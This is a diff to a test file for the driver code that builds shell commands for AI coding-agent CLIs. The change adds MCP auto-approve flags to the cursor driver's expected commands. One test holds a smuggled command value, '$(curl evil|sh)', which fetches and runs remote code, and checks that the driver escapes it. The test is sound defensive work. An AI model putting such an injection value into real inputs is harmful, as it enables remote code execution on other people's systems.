@@ -4,6 +4,11 @@
  * tools/workflows/src/bin/run-iteration.ts. The expected strings are snapshots of the legacy output
  * (structure/flags/escaping are cross-checked against tools/workflows' run-iteration.test.ts
  * assertions); nothing is imported from tools/workflows here. `p $(x)` exercises `$` neutralization.
+ *
+ * Cursor is the one deliberate divergence: it now also emits {@link CURSOR_MCP} to attach the
+ * workspace's MCP servers headlessly (plan a08e7d24). Every cursor expectation below threads that
+ * suffix in at its real position — after `--model`, before the worktree flags — so the flag ORDER
+ * stays asserted, not just its presence.
  */
 
 import { describe, expect, it } from 'vitest';
@@ -15,6 +20,10 @@ const PROMPT = 'p $(x)';
 const SAFE = 'p \\$(x)';
 const CLAUDE_BASE = `claude -p --permission-mode acceptEdits "${SAFE}"`;
 const CURSOR_BASE = `cursor-agent --force -p "${SAFE}"`;
+/** MCP-attachment flags the cursor driver appends after `--model` and before worktree flags. */
+const CURSOR_MCP = ' --approve-mcps --trust';
+/** Cursor's command with no model and no worktree. */
+const CURSOR_CMD = `${CURSOR_BASE}${CURSOR_MCP}`;
 
 const config = (
   extra: Omit<DriverInvocationConfig, 'iteration' | 'prompt'>,
@@ -97,11 +106,20 @@ describe('claude driver parity', () => {
     ).toBe(CLAUDE_BASE);
   });
 
+  it('emits no MCP flags (the CLI attaches project .mcp.json on its own)', () => {
+    const command = claudeDriver.buildShellCommand(config({}));
+    expect(command).not.toContain('--approve-mcps');
+    expect(command).not.toContain('--mcp-config');
+    expect(command).not.toContain('--strict-mcp-config');
+    expect(command).toBe(CLAUDE_BASE);
+  });
+
   it('advertises claude capabilities and label', () => {
     expect(claudeDriver.id).toBe('claude');
     expect(claudeDriver.label).toBe('claude-code');
     expect(claudeDriver.capabilities).toEqual({
       chatStreaming: true,
+      mcpAutoApprove: false,
       permissionMode: true,
       skipWorktreeSetup: false,
       supportsCustomBaseUrl: false,
@@ -113,26 +131,26 @@ describe('claude driver parity', () => {
 });
 
 describe('cursor driver parity', () => {
-  it('base command (no model, no worktree)', () => {
-    expect(cursorDriver.buildShellCommand(config({}))).toBe(CURSOR_BASE);
+  it('base command (no model, no worktree) — includes the MCP flags', () => {
+    expect(cursorDriver.buildShellCommand(config({}))).toBe(CURSOR_CMD);
   });
 
   it('emits --model even for auto (unlike claude)', () => {
     expect(cursorDriver.buildShellCommand(config({ model: 'auto' }))).toBe(
-      `${CURSOR_BASE} --model auto`,
+      `${CURSOR_BASE} --model auto${CURSOR_MCP}`,
     );
   });
 
   it('emits --model for a plain model', () => {
     expect(cursorDriver.buildShellCommand(config({ model: 'sonnet' }))).toBe(
-      `${CURSOR_BASE} --model sonnet`,
+      `${CURSOR_BASE} --model sonnet${CURSOR_MCP}`,
     );
   });
 
   it('escapes a malicious --model value', () => {
     expect(
       cursorDriver.buildShellCommand(config({ model: '$(curl evil|sh)' })),
-    ).toBe(`${CURSOR_BASE} --model "\\$(curl evil|sh)"`);
+    ).toBe(`${CURSOR_BASE} --model "\\$(curl evil|sh)"${CURSOR_MCP}`);
   });
 
   it('appends -w, --worktree-base, and --skip-worktree-setup in legacy order', () => {
@@ -146,7 +164,7 @@ describe('cursor driver parity', () => {
           },
         }),
       ),
-    ).toBe(`${CURSOR_BASE} -w wt --worktree-base main --skip-worktree-setup`);
+    ).toBe(`${CURSOR_CMD} -w wt --worktree-base main --skip-worktree-setup`);
   });
 
   it('omits empty worktree-base and false skip-worktree-setup', () => {
@@ -160,13 +178,13 @@ describe('cursor driver parity', () => {
           },
         }),
       ),
-    ).toBe(`${CURSOR_BASE} -w wt`);
+    ).toBe(`${CURSOR_CMD} -w wt`);
   });
 
   it('appends bare -w for the flag-only worktree sentinel', () => {
     expect(
       cursorDriver.buildShellCommand(config({ worktree: { worktree: '' } })),
-    ).toBe(`${CURSOR_BASE} -w`);
+    ).toBe(`${CURSOR_CMD} -w`);
   });
 
   it('ignores a local endpoint (supportsCustomBaseUrl is false)', () => {
@@ -179,7 +197,7 @@ describe('cursor driver parity', () => {
           },
         }),
       ),
-    ).toBe(CURSOR_BASE);
+    ).toBe(CURSOR_CMD);
   });
 
   it('advertises cursor capabilities and label', () => {
@@ -187,6 +205,7 @@ describe('cursor driver parity', () => {
     expect(cursorDriver.label).toBe('cursor-agent');
     expect(cursorDriver.capabilities).toEqual({
       chatStreaming: true,
+      mcpAutoApprove: true,
       permissionMode: false,
       skipWorktreeSetup: true,
       supportsCustomBaseUrl: false,
